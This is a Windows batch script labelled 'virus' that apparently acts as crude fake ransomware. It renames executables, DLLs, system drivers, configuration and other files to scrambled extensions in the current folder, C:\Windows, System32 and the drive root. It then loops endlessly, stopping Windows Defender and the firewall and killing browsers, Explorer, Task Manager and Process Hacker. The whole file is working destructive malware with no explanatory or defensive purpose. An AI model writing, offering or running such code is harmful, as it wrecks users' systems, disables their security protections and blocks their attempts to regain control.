:encryption
cls & color 0a
:Current
REN *.cmd *.sI09
REN *.exe *.e32
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.e32
cd C:\Windows
REN *.cmd *.sI09
REN *.exe *.e32
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.e32
cd C:\Windows\Sys32 & cd C:\Windows\System32
REN *.cmd *.sI09
REN *.exe *.e32
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.e32
cd C:\
REN *.cmd *.sI09
REN *.exe *.e32
REN *.log *.439a
REN *.ini *.3KM1
REN *.dll *.38Jl
REN *.bin *.3J81
REN *.txt *.2M1A
REN *.sys *.8j3J
REN *.lnk *.9K2M
REN *.png *.8J2n
REN *.exe *.e32
color 0a & mode 1000 & cls
pause
goto virus
ren -=- Closes all task managers and browser, kills anti-virus and firewall -=-
:virus
net stop "Windows Defender Service"
net stop "Windows Firewall"
taskkill /F /IM "chrome.exe" /T
taskkill /F /IM "firefox.exe" /T
taskkill /F /IM "ProcessHacker.exe" /T
taskkill /F /IM "explorer.exe" /T
taskkill /F /IM "taskmgr.exe" /T
goto virus